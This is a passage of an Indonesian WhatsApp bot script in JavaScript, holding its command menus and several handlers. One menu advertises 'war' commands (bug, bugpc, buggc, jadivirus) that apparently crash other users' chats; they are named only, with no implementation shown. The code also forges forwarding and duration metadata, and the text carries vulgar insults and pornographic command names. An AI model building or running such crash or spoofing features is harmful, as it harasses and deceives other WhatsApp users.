if (isCmd && antiSpam.isFiltered(from) && !isGroup) { console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
return replyy('😒Sabar Kontol 10 Detik/Command')}  
if (isCmd && antiSpam.isFiltered(from) && isGroup) { console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
return replyy('😒Sabar Kontol 10 Detik/Command')}
if (isCmd && !isOwner) antiSpam.addFilter(from)
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ᗰᗴᑎᑌ🤓]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
switch (command) {   
//SEBENARNYA BUTTON LOKASI SIH TAPI KEK NYA JELEK
//KALO BUTTON IMAGE DELAY JUGA YA BINGGUNG ASW
case 'menu':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (isBanned)return sticBanned(from)
teks =
`
          █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
          █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
          █░░║║║╠─║─║─║║║║║╠─░░█
          █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
          █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

❏IᑎᖴO ᗷOT❏
╔═════════════════⎉
║冬Nᴀᴍᴀ Bᴏᴛ : ${botname}
║冬NAMA Oᴡɴᴇʀ : ${ownername}
║冬Mʏ Tᴇᴀᴍ : Wᴏɴɢ々Hᴏʀᴇ々Tᴇᴀᴍ.in
║冬Nᴏᴍᴏʀ Oᴡɴᴇʀ : ${owner}
║冬Cʀᴇᴀᴛᴏʀ : ${creator}
║冬Mᴏᴅᴇ : ${publik ? 'Public' : 'Self'}
║冬Rᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}
║冬Pʀᴇғ : Multi
║冬Bᴀᴛᴛᴇʀʏʏ : ${baterai.battery}
║冬Cʜᴀʀɢᴇᴅ : ${baterai.isCharge ? 'Cas' : 'Tidak'}
║冬Aᴜᴛᴏʀᴇᴀᴅ Pᴄ : ${readP ? 'On' : 'Off'}
║冬Aᴜᴛᴏʀᴇᴀᴅ Gᴄ : ${readG ? 'On' : 'Off'}
║冬Aᴜᴛᴏ Kᴇᴛɪᴋ : ${ngetik ? 'On' : 'Off'}
║冬Aᴜᴛᴏ Rᴇᴄᴏʀᴅɪɴɢ : ${autovn ? 'On' : 'Off'}
╚═════════════════❍ 
❏IᑎᖴO ᑌՏᗴᖇ❏
┏━━⊱ 
┣🔰Nᴀᴍᴀ Usᴇʀ : ${pushname}
┣🔰Nᴏᴍᴇʀ Usᴇʀ : ${sender.split("@")[0]}
┗━━⊱
❏TO ᗪᗩY❏
┏━━⊱ 
┣🗣${tampilUcapan}
┣🕑Jam : ${time}
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
ₛᵤBₛCᵣᵢBₑ

https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
`
gam = fs.readFileSync('./media/thumnail.jpg')
but = [
{buttonId: `${prefix}command`, buttonText: { displayText: 'メᗰᗴᑎᑌメ' }, type: 1 },
{buttonId: `${prefix}allmenu`, buttonText: { displayText: 'メᗩᒪᒪ ᗰᗴᑎᑌメ' }, type: 1 },
{buttonId: `${prefix}menucatalog`, buttonText: { displayText: 'メᑕᗩTᗩᒪOᘜ ᗰᗴᑎᑌメ' }, type: 1 },
]
sendButImages(from, teks, "HANZ々OFC彡", gam, but)        
break
//ᗩᒪᒪ ᗰᗴᑎᑌ ᖴOTO+ᗪOᑕᑌᗰᗴᑎT
case 'allmenu':
sticWait(from)
ptod = "6285706035039@s.whatsapp.net"
stod = `Hai👋 Saya ${botname}`
uwu = '```'
stst = await Hanz.getStatus(`${sender.split('@')[0]}@c.us`)
stst = stst.status == 401 ? '' : stst.status
menu = `Hai👋 Im ${botname}:)
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰──『A͜͡L͜͡L々͜͡M͜͡E͜͡N͜͡U.in͜͡ 』──➤ ↶↷*
╰•͙✩̣̣̣̣ Hai! ${pushname}
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲 *『 ᘜᖇOᑌᑭ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ᴀɴᴛɪʟɪɴᴋ
⁙┃〲◦➛${prefix}ᴡᴇʟᴄᴏᴍᴇ
⁙┃〲◦➛${prefix}ɢʀᴏᴜᴘ
⁙┃〲◦➛${prefix}ʟɪɴᴋɢʀᴏᴜᴘ
⁙┃〲◦➛${prefix}ᴘʀᴏᴍᴏᴛᴇ
⁙┃〲◦➛${prefix}ᴅᴇᴍᴏᴛᴇ
⁙┃〲◦➛${prefix}ʟɪsᴛᴏɴʟɪɴᴇ
⁙┃〲◦➛${prefix}ᴛᴀɢᴀʟʟ
⁙┃〲◦➛${prefix}ʜɪᴅᴇᴛᴀɢ
⁙┃〲◦➛${prefix}ᴛᴏᴛᴀɢ
⁙┃〲◦➛${prefix}ᴘᴇsᴏɴ
⁙┃〲◦➛${prefix}ᴘᴇsᴏғғ
⁙┃〲◦➛${prefix}ᴀᴅᴅ
⁙┃〲◦➛${prefix}ᴋɪᴄᴋ
⁙┃〲◦➛${prefix}sᴇᴛᴘᴘ
⁙┃〲◦➛${prefix}sᴇᴛᴅᴇsᴄ
⁙┃〲◦➛${prefix}sᴇᴛɴᴀᴍᴇ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲  *『 Oᗯᑎᗴᖇ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}sᴇᴛ
⁙┃〲◦➛${prefix}ᴀᴜᴛᴏ
⁙┃〲◦➛${prefix}ᴀᴜᴛᴏʀᴇsᴘᴏɴ
⁙┃〲◦➛${prefix}ᴀᴅᴅᴄᴍᴅ
⁙┃〲◦➛${prefix}ᴅᴇʟᴄᴍᴅ
⁙┃〲◦➛${prefix}ʟɪsᴛᴄᴍᴅ
⁙┃〲◦➛${prefix}sᴇʟғ/ᴘᴜʙʟɪᴄ
⁙┃〲◦➛${prefix}ʀᴇsᴛᴀʀᴛ
⁙┃〲◦➛${prefix}sᴇᴛᴘᴘʙᴏᴛ
⁙┃〲◦➛${prefix}sᴇᴛᴘᴘᴡᴀ
⁙┃〲◦➛${prefix}ᴜᴘsᴡᴛᴇxᴛ
⁙┃〲◦➛${prefix}ᴜᴘsᴡsᴛɪᴄᴋᴇʀ
⁙┃〲◦➛${prefix}ᴜᴘsᴡᴠɴ
⁙┃〲◦➛${prefix}ᴜᴘsᴡᴀᴜᴅɪᴏ
⁙┃〲◦➛${prefix}ᴜᴘsᴡɪᴍᴀɢᴇ
⁙┃〲◦➛${prefix}ᴜᴘsᴡᴠɪᴅᴇᴏ
⁙┃〲◦➛${prefix}ᴜᴘsᴡɢɪғ
⁙┃〲◦➛${prefix}ᴜᴘsᴡʟᴏᴋᴀsɪ
⁙┃〲◦➛${prefix}ʙᴄɢᴄ
⁙┃〲◦➛${prefix}ʙᴄ2
⁙┃〲◦➛${prefix}ʙᴄ
⁙┃〲◦➛${prefix}ᴛᴏʙᴄ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲  *『 Iᗰᗩᘜᗴ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ғᴏx
⁙┃〲◦➛${prefix}ᴄᴀᴛ
⁙┃〲◦➛${prefix}ʙɪʀᴅ
⁙┃〲◦➛${prefix}ʟᴏʟɪ
⁙┃〲◦➛${prefix}ᴊᴏᴋᴇs
⁙┃〲◦➛${prefix}ᴋᴏᴀʟᴀ
⁙┃〲◦➛${prefix}ᴍᴇᴍᴇ
⁙┃〲◦➛${prefix}ᴀɴɪᴍᴇ
⁙┃〲◦➛${prefix}ᴅᴀʀᴋᴊᴏᴋᴇs
⁙┃〲◦➛${prefix}ᴍᴇᴍᴇɪɴᴅᴏ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲 *『 ᗰᗩKᗴᖇ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ᴛᴀʜᴛᴀ
⁙┃〲◦➛${prefix}ɴᴇᴏɴ2
⁙┃〲◦➛${prefix}ᴡᴀʟʟ
⁙┃〲◦➛${prefix}ᴡᴏʟғ
⁙┃〲◦➛${prefix}ᴛғɪʀᴇ
⁙┃〲◦➛${prefix}ʏᴛɢᴏʟᴅ
⁙┃〲◦➛${prefix}ʏᴛsɪʟᴠᴇʀ
⁙┃〲◦➛${prefix}ᴛ3ᴅ
⁙┃〲◦➛${prefix}ʟᴏɢᴏᴀ
⁙┃〲◦➛${prefix}ᴘᴏʀɴʜᴜʙ
⁙┃〲◦➛${prefix}ᴍᴀʀᴠᴇʟ
⁙┃〲◦➛${prefix}ʟᴇᴀᴠᴇsᴛ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲 *『 ՏOᑌᑎᗪ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ1
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ2
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ3
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ4
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ5
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ6
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ7
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ8
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ9
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ10
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲 *『 ᖴᖴᗰᑭᗴᘜ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}s
⁙┃〲◦➛${prefix}sᴛɪᴄᴋᴇʀ
⁙┃〲◦➛${prefix}sᴛɪᴄᴋᴇʀᴡᴍ
⁙┃〲◦➛${prefix}sᴡᴍ
⁙┃〲◦➛${prefix}sᴍᴇᴍᴇ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲 *『 ᑎᑌᒪIՏ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ɴᴜʟɪs1
⁙┃〲◦➛${prefix}ɴᴜʟɪs2
⁙┃〲◦➛${prefix}ɴᴜʟɪs3
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲  *『 ᖇᗩᑎᗪOᗰ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ᴅᴇᴛɪᴋᴠɴ
⁙┃〲◦➛${prefix}ᴅᴇᴛɪᴋᴠɪᴅᴇᴏ
⁙┃〲◦➛${prefix}ᴛᴛᴍᴜsɪᴋ
⁙┃〲◦➛${prefix}ᴘʟᴀʏ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲  *『 ᗩᑎIᗰᗴ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ʟᴏʟɪ
⁙┃〲◦➛${prefix}ᴀɴɪᴍᴇ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲 *『 ՏᗴՏᗩᗪ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ᴋᴏᴅᴇɴᴜᴋʟɪʀ
⁙┃〲◦➛${prefix}ʟɪɴᴋʙᴏᴋᴇᴘ
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ
⁙┃〲◦➛${prefix}ᴀsᴜᴘᴀɴ
⁙┃〲◦➛${prefix}ɴᴇᴋᴏ
⁙┃〲◦➛${prefix}ᴀᴡᴏᴏ
⁙┃〲◦➛${prefix}ʙʟᴏᴡᴊᴏʙ
⁙┃〲◦➛${prefix}ʜᴇɴᴛᴀɪ
⁙┃〲◦➛${prefix}ᴍᴇɢᴜᴍɪɴ
⁙┃〲◦➛${prefix}ᴛʀᴀᴘɴɪᴍᴇ
⁙┃〲◦➛${prefix}ᴀsᴜᴘᴀɴ
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ1
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ2
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ3
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ4
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ5
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ6
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ7
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ8
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ9
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ10
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ11
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ12
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ13
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ14
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ15
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲  *『 ᘜᗩᗰᗴ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}sᴜɪᴛ
⁙┃〲◦➛${prefix}ᴄᴀᴋʟᴏɴᴛᴏɴɢ
⁙┃〲◦➛${prefix}ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
⁙┃〲◦➛${prefix}ғᴀᴍɪʟʏ100
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲  *『 ᗯᗩᖇ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ʙᴜɢ
⁙┃〲◦➛${prefix}ᴄᴀʀᴅ
⁙┃〲◦➛${prefix}ʙᴜɢʟɪsᴛ
⁙┃〲◦➛${prefix}ᴛʀᴏʟɪᴠ2
⁙┃〲◦➛${prefix}ʜᴀɴᴢᴏғᴄ
⁙┃〲◦➛${prefix}ʙᴜɢɢᴄ
⁙┃〲◦➛${prefix}ʙᴜɢʟᴏᴄ
⁙┃〲◦➛${prefix}ʙᴜɢᴘᴄ
⁙┃〲◦➛${prefix}ᴊᴀᴅɪᴠɪʀᴋᴏɴ
⁙┃〲◦➛${prefix}ʙᴜɢʙᴜᴛᴛᴏɴ
⁙┃〲◦➛${prefix}ᴊᴀᴅɪᴋᴀᴛᴀʟᴏɢ
⁙┃〲◦➛${prefix}ᴛᴏᴠɪʀɢᴀᴍ
⁙┃〲◦➛${prefix}ᴊᴀᴅɪᴠɪʀᴜs
⁙┃〲◦➛${prefix}ᴊᴀᴅɪᴠɪʀᴠɪᴅ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
🇦 🇱 🇱  🇲 🇪 🇳 🇺  🇩 🇮 🇰 🇮 🇹 😒
`
Sendbutdocument(from, `${menu}`, "*Haris Ganz*",
fs.readFileSync('./media/Hanz'),
{mimetype:Mimetype.pdf, 
thumbnail:fs.readFileSync('./media/imagepdf.jpg'),
filename:`HANZ々OFC彡`},
[{buttonId:`${prefix}donasi`,buttonText:{displayText:'ᗪOᑎᗩՏI'},type:1},//DI PENCET GK RESPON
{buttonId:`${prefix}ucapan`,buttonText:{displayText:'ᑌᑕᗩᑭᗩᑎ'},type:1},//INI JUGA
{buttonId:`${prefix}sc`,buttonText:{displayText:'ՏᑕTIᑭT'},type:1}],//DAN INI JUGA
{quoted:fdoc, contextInfo: { mentionedJid: [dtod,otod,stod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`HANZ々OFC彡 [BOTZ🎭]`,body:`Script By Haris Ganz`,mediaType:"2",thumbnail:fakeimage,mediaUrl:`https://www.instagram.com/reel/CYWTXmuJnf2/ugh_Yfb_gii_kontol`}}})
break
case 'cok':
sticWait(from)
ptod = "6285706035039@s.whatsapp.net"
stod = `Hai👋 Saya ${botname}`
menu = `
🇦 🇱 🇱  🇲 🇪 🇳 🇺  🇩 🇮 🇰 🇮 🇹 
`
sendcok(from, `${menu}`, "*Haris Ganz*",
fs.readFileSync('./media/Hanz Ofc.pdf'),
{mimetype:Mimetype.pdf, 
filename:`HANZ々OFC彡`},
[{buttonId:`${prefix}donasi`,buttonText:{displayText:'ᗪOᑎᗩՏI'},type:1},//DI PENCET GK RESPON
{buttonId:`${prefix}ucapan`,buttonText:{displayText:'ᑌᑕᗩᑭᗩᑎ'},type:1},//INI JUGA
{buttonId:`${prefix}sc`,buttonText:{displayText:'ՏᑕTIᑭT'},type:1}],//DAN INI JUGA
{quoted:fdoc, contextInfo: { mentionedJid: [dtod,otod,stod], forwardingScore: 508, isForwarded: true, mediaType:"2",thumbnail:fakeimage,}})
break
//ᗰᗴᑎᑌ ᑕᗩTᗩᒪOᘜ
case 'menucatalog':
sticWait(from)
ptod = "6285706035039@s.whatsapp.net"
stod = `Hai👋 Saya ${botname}`
menunya = `╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰──『A͜͡L͜͡L͜͡ M͜͡E͜͡N͜͡U͜͡ C͜͡A͜͡T͜͡A͜͡L͜͡O͜͡G͜͡』──➤ ↶↷*
╰•͙✩̣̣̣̣ Hai! ${pushname}
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲 *『 ᘜᖇOᑌᑭ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ᴀɴᴛɪʟɪɴᴋ
⁙┃〲◦➛${prefix}ᴡᴇʟᴄᴏᴍᴇ
⁙┃〲◦➛${prefix}ɢʀᴏᴜᴘ
⁙┃〲◦➛${prefix}ʟɪɴᴋɢʀᴏᴜᴘ
⁙┃〲◦➛${prefix}ᴘʀᴏᴍᴏᴛᴇ
⁙┃〲◦➛${prefix}ᴅᴇᴍᴏᴛᴇ
⁙┃〲◦➛${prefix}ʟɪsᴛᴏɴʟɪɴᴇ
⁙┃〲◦➛${prefix}ᴛᴀɢᴀʟʟ
⁙┃〲◦➛${prefix}ʜɪᴅᴇᴛᴀɢ
⁙┃〲◦➛${prefix}ᴛᴏᴛᴀɢ
⁙┃〲◦➛${prefix}ᴘᴇsᴏɴ
⁙┃〲◦➛${prefix}ᴘᴇsᴏғғ
⁙┃〲◦➛${prefix}ᴀᴅᴅ
⁙┃〲◦➛${prefix}ᴋɪᴄᴋ
⁙┃〲◦➛${prefix}sᴇᴛᴘᴘ
⁙┃〲◦➛${prefix}sᴇᴛᴅᴇsᴄ
⁙┃〲◦➛${prefix}sᴇᴛɴᴀᴍᴇ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲  *『 Oᗯᑎᗴᖇ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}sᴇᴛ
⁙┃〲◦➛${prefix}ᴀᴜᴛᴏ
⁙┃〲◦➛${prefix}ᴀᴜᴛᴏʀᴇsᴘᴏɴ
⁙┃〲◦➛${prefix}ᴀᴅᴅᴄᴍᴅ
⁙┃〲◦➛${prefix}ᴅᴇʟᴄᴍᴅ
⁙┃〲◦➛${prefix}ʟɪsᴛᴄᴍᴅ
⁙┃〲◦➛${prefix}sᴇʟғ/ᴘᴜʙʟɪᴄ
⁙┃〲◦➛${prefix}ʀᴇsᴛᴀʀᴛ
⁙┃〲◦➛${prefix}sᴇᴛᴘᴘʙᴏᴛ
⁙┃〲◦➛${prefix}sᴇᴛᴘᴘᴡᴀ
⁙┃〲◦➛${prefix}ᴜᴘsᴡᴛᴇxᴛ
⁙┃〲◦➛${prefix}ᴜᴘsᴡsᴛɪᴄᴋᴇʀ
⁙┃〲◦➛${prefix}ᴜᴘsᴡᴠɴ
⁙┃〲◦➛${prefix}ᴜᴘsᴡᴀᴜᴅɪᴏ
⁙┃〲◦➛${prefix}ᴜᴘsᴡɪᴍᴀɢᴇ
⁙┃〲◦➛${prefix}ᴜᴘsᴡᴠɪᴅᴇᴏ
⁙┃〲◦➛${prefix}ᴜᴘsᴡɢɪғ
⁙┃〲◦➛${prefix}ᴜᴘsᴡʟᴏᴋᴀsɪ
⁙┃〲◦➛${prefix}ʙᴄɢᴄ
⁙┃〲◦➛${prefix}ʙᴄ2
⁙┃〲◦➛${prefix}ʙᴄ
⁙┃〲◦➛${prefix}ᴛᴏʙᴄ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲  *『 Iᗰᗩᘜᗴ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ғᴏx
⁙┃〲◦➛${prefix}ᴄᴀᴛ
⁙┃〲◦➛${prefix}ʙɪʀᴅ
⁙┃〲◦➛${prefix}ʟᴏʟɪ
⁙┃〲◦➛${prefix}ᴊᴏᴋᴇs
⁙┃〲◦➛${prefix}ᴋᴏᴀʟᴀ
⁙┃〲◦➛${prefix}ᴍᴇᴍᴇ
⁙┃〲◦➛${prefix}ᴀɴɪᴍᴇ
⁙┃〲◦➛${prefix}ᴅᴀʀᴋᴊᴏᴋᴇs
⁙┃〲◦➛${prefix}ᴍᴇᴍᴇɪɴᴅᴏ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲 *『 ᗰᗩKᗴᖇ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ᴛᴀʜᴛᴀ
⁙┃〲◦➛${prefix}ɴᴇᴏɴ2
⁙┃〲◦➛${prefix}ᴡᴀʟʟ
⁙┃〲◦➛${prefix}ᴡᴏʟғ
⁙┃〲◦➛${prefix}ᴛғɪʀᴇ
⁙┃〲◦➛${prefix}ʏᴛɢᴏʟᴅ
⁙┃〲◦➛${prefix}ʏᴛsɪʟᴠᴇʀ
⁙┃〲◦➛${prefix}ᴛ3ᴅ
⁙┃〲◦➛${prefix}ʟᴏɢᴏᴀ
⁙┃〲◦➛${prefix}ᴘᴏʀɴʜᴜʙ
⁙┃〲◦➛${prefix}ᴍᴀʀᴠᴇʟ
⁙┃〲◦➛${prefix}ʟᴇᴀᴠᴇsᴛ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲 *『 ՏOᑌᑎᗪ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ1
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ2
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ3
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ4
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ5
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ6
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ7
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ8
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ9
⁙┃〲◦➛${prefix}sᴏᴜɴᴅ10
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲 *『 ᖴᖴᗰᑭᗴᘜ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}s
⁙┃〲◦➛${prefix}sᴛɪᴄᴋᴇʀ
⁙┃〲◦➛${prefix}sᴛɪᴄᴋᴇʀᴡᴍ
⁙┃〲◦➛${prefix}sᴡᴍ
⁙┃〲◦➛${prefix}sᴍᴇᴍᴇ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲 *『 ᑎᑌᒪIՏ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ɴᴜʟɪs1
⁙┃〲◦➛${prefix}ɴᴜʟɪs2
⁙┃〲◦➛${prefix}ɴᴜʟɪs3
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲  *『 ᖇᗩᑎᗪOᗰ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ᴅᴇᴛɪᴋᴠɴ
⁙┃〲◦➛${prefix}ᴅᴇᴛɪᴋᴠɪᴅᴇᴏ
⁙┃〲◦➛${prefix}ᴛᴛᴍᴜsɪᴋ
⁙┃〲◦➛${prefix}ᴘʟᴀʏ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲 *『 ՏᗴՏᗩᗪ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ᴋᴏᴅᴇɴᴜᴋʟɪʀ
⁙┃〲◦➛${prefix}ʟɪɴᴋʙᴏᴋᴇᴘ
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ
⁙┃〲◦➛${prefix}ᴀsᴜᴘᴀɴ
⁙┃〲◦➛${prefix}ɴᴇᴋᴏ
⁙┃〲◦➛${prefix}ᴀᴡᴏᴏ
⁙┃〲◦➛${prefix}ʙʟᴏᴡᴊᴏʙ
⁙┃〲◦➛${prefix}ʜᴇɴᴛᴀɪ
⁙┃〲◦➛${prefix}ᴍᴇɢᴜᴍɪɴ
⁙┃〲◦➛${prefix}ᴛʀᴀᴘɴɪᴍᴇ
⁙┃〲◦➛${prefix}ᴀsᴜᴘᴀɴ
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ1
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ2
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ3
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ4
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ5
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ6
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ7
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ8
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ9
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ10
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ11
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ12
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ13
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ14
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ15
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲  *『 ᘜᗩᗰᗴ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}sᴜɪᴛ
⁙┃〲◦➛${prefix}ᴄᴀᴋʟᴏɴᴛᴏɴɢ
⁙┃〲◦➛${prefix}ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
⁙┃〲◦➛${prefix}ғᴀᴍɪʟʏ100
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
⁙┃〲  *『 ᗯᗩᖇ ᗰᗴᑎᑌ 』*
⁙┃〲◦➛${prefix}ʙᴜɢ
⁙┃〲◦➛${prefix}ᴄᴀʀᴅ
⁙┃〲◦➛${prefix}ʙᴜɢʟɪsᴛ
⁙┃〲◦➛${prefix}ᴛʀᴏʟɪᴠ2
⁙┃〲◦➛${prefix}ʜᴀɴᴢᴏғᴄ
⁙┃〲◦➛${prefix}ʙᴜɢɢᴄ
⁙┃〲◦➛${prefix}ʙᴜɢʟᴏᴄ
⁙┃〲◦➛${prefix}ʙᴜɢᴘᴄ
⁙┃〲◦➛${prefix}ᴊᴀᴅɪᴠɪʀᴋᴏɴ
⁙┃〲◦➛${prefix}ʙᴜɢʙᴜᴛᴛᴏɴ
⁙┃〲◦➛${prefix}ᴊᴀᴅɪᴋᴀᴛᴀʟᴏɢ
⁙┃〲◦➛${prefix}ᴛᴏᴠɪʀɢᴀᴍ
⁙┃〲◦➛${prefix}ᴊᴀᴅɪᴠɪʀᴜs
⁙┃〲◦➛${prefix}ᴊᴀᴅɪᴠɪʀᴠɪᴅ
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
🇦 🇱 🇱  🇲 🇪 🇳 🇺  🇩 🇮 🇰 🇮 🇹 😒
`
var imgs = await Hanz.prepareMessage('0@c.us', fakeimage, image, { thumbnail: fakeimage })
var imgCatalog = imgs.message.imageMessage
var ctlg = await Hanz.prepareMessageFromContent(from, {
"productMessage": {
"product": {
"productImage": imgCatalog,
"productId": "4457725420906655",
"title": `メMÈñÚ ÇÄ†ÄLÖG`,
"description": menunya,
"footerText": `メHANZ OFC`,
"currencyCode": "USD",
"priceAmount1000": "0",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "0",
"retailerId": `All Menu Catalog`,
"url": "HANZ々OFC彡 [BOTZ]"
},
"businessOwnerJid": "6283144394823@s.whatsapp.net",
}
}, { quoted: ftrol, mimetype: 'image/jpeg' })
Hanz.relayWAMessage(ctlg)
break
case 'ucapan':
haris = await getBuffer(`http://hadi-api.herokuapp.com/api/tts?text=Kontol Bapak Kau&language=id`)
Hanz.sendMessage(from, haris, MessageType.audio, {quoted: floc, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break          
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ᗰᗴᑎᑌ ᒪIՏT]<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
//MENU LIST COK
  case 'command':
res = await Hanz.prepareMessageFromContent(from,{
"listMessage": {
"title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
"description": `╔═════════════════⎉
║冬Nᴀᴍᴀ Bᴏᴛ : ${botname}
║冬Nᴀᴍᴀ Oᴡɴᴇʀ : ${ownername}
